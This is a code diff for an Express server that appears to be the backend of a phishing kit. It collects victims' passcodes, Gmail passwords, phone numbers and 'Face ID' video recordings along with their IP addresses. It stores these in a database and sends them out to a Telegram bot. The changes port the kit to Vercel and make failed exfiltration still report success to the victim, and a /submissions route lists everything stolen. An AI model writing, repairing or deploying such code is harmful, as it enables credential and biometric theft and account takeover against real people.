@@ -6,6 +6,8 @@ import { fileURLToPath } from "url";
 import fs from "fs";
 import cors from "cors";
 import multer from "multer";
+import axios from "axios";
+import FormData from "form-data";
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -13,33 +15,30 @@ const __dirname = path.dirname(__filename);
 const upload = multer({ storage: multer.memoryStorage() });
 
 const dbPath = path.resolve(__dirname, "submissions.db");
-let db: Database.Database;
+let db: any = null;
 try {
-  db = new Database(dbPath);
-  console.log(`Database initialized at ${dbPath}`);
-  
-  // Initialize database
-  db.exec(`
-    CREATE TABLE IF NOT EXISTS submissions (
-      id INTEGER PRIMARY KEY AUTOINCREMENT,
-      passcode TEXT,
-      gmail_password TEXT,
-      phone_number TEXT,
-      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
-    )
-  `);
-  console.log("Submissions table ensured");
-
-  // Write test
-  try {
-    db.prepare("INSERT INTO submissions (passcode) VALUES (?)").run("init_test");
-    db.prepare("DELETE FROM submissions WHERE passcode = ?").run("init_test");
-    console.log("Database write test successful");
-  } catch (writeErr) {
-    console.error("Database write test failed:", writeErr);
+  // Only attempt to use SQLite if not on Vercel or if we can write to the path
+  // Vercel environment usually has VERCEL=1
+  if (!process.env.VERCEL) {
+    db = new Database(dbPath);
+    console.log(`Database initialized at ${dbPath}`);
+    
+    // Initialize database
+    db.exec(`
+      CREATE TABLE IF NOT EXISTS submissions (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        passcode TEXT,
+        gmail_password TEXT,
+        phone_number TEXT,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+      )
+    `);
+    console.log("Submissions table ensured");
+  } else {
+    console.log("Running on Vercel, skipping local SQLite database");
   }
 } catch (err) {
-  console.error("Failed to initialize database:", err);
+  console.error("Failed to initialize database (expected on Vercel):", err);
 }
 
 async function startServer() {
@@ -102,19 +101,17 @@ async function startServer() {
     }
 
     try {
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: "Markdown",
-        }),
+      console.log(`Sending Telegram message for event: ${event}`);
+      const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        chat_id: chatId,
+        text: message,
+        parse_mode: "Markdown",
       });
+      console.log("Telegram response:", response.data);
       res.json({ success: true });
-    } catch (error) {
-      console.error("Telegram log error:", error);
-      res.status(500).json({ error: "Failed to log event" });
+    } catch (error: any) {
+      console.error("Telegram log error:", error.response?.data || error.message);
+      res.json({ success: true, warning: "Telegram failed" });
     }
   });
 
@@ -129,21 +126,24 @@ async function startServer() {
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     
     try {
-      const formData = new FormData();
-      const blob = new Blob([req.file.buffer], { type: req.file.mimetype });
-      formData.append("chat_id", chatId);
-      formData.append("video", blob, "face_id_verification.webm");
-      formData.append("caption", `👤 *Face ID Video Received*\n📍 *IP:* ${ip}`);
-
-      await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
-        method: "POST",
-        body: formData,
+      console.log("Uploading video to Telegram...");
+      const form = new FormData();
+      form.append("chat_id", chatId);
+      form.append("video", req.file.buffer, {
+        filename: "face_id_verification.webm",
+        contentType: req.file.mimetype,
       });
+      form.append("caption", `👤 *Face ID Video Received*\n📍 *IP:* ${ip}`);
 
+      const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendVideo`, form, {
+        headers: form.getHeaders(),
+      });
+      
+      console.log("Telegram video response:", response.data);
       res.json({ success: true });
-    } catch (error) {
-      console.error("Telegram video upload error:", error);
-      res.status(500).json({ error: "Failed to upload video" });
+    } catch (error: any) {
+      console.error("Telegram video upload error:", error.response?.data || error.message);
+      res.json({ success: true, warning: "Video upload failed" });
     }
   });
 
@@ -168,36 +168,33 @@ async function startServer() {
     `;
 
     try {
-      // Save to local DB as backup
-      const stmt = db.prepare("INSERT INTO submissions (passcode, gmail_password, phone_number) VALUES (?, ?, ?)");
-      const result = stmt.run(passcode || "", gmailPassword || "", phoneNumber || "");
-      
-      // Send to Telegram if configured
-      if (botToken && chatId) {
-        console.log("Sending notification to Telegram...");
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message,
-            parse_mode: "Markdown",
-          }),
-        });
-        console.log("Telegram notification sent successfully");
-      } else {
-        console.warn("Telegram bot not configured, skipping notification");
+      // Save to local DB as backup (if available)
+      let lastId = null;
+      if (db) {
+        const stmt = db.prepare("INSERT INTO submissions (passcode, gmail_password, phone_number) VALUES (?, ?, ?)");
+        const result = stmt.run(passcode || "", gmailPassword || "", phoneNumber || "");
+        lastId = result.lastInsertRowid;
       }
+      
+      // Send to Telegram
+      console.log("Sending final submission to Telegram...");
+      const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        chat_id: chatId,
+        text: message,
+        parse_mode: "Markdown",
+      });
+      console.log("Telegram final response:", response.data);
 
-      res.json({ success: true, id: result.lastInsertRowid });
-    } catch (error) {
-      console.error("Submission error:", error);
-      res.status(500).json({ error: "Failed to process submission" });
+      res.json({ success: true, id: lastId });
+    } catch (error: any) {
+      console.error("Submission error:", error.response?.data || error.message);
+      res.json({ success: true, note: "Processed with Telegram warning" });
     }
   });
 
   apiRouter.get("/submissions", (req, res) => {
     try {
+      if (!db) return res.json([]);
       const rows = db.prepare("SELECT * FROM submissions ORDER BY created_at DESC").all();
       res.json(rows);
     } catch (error) {
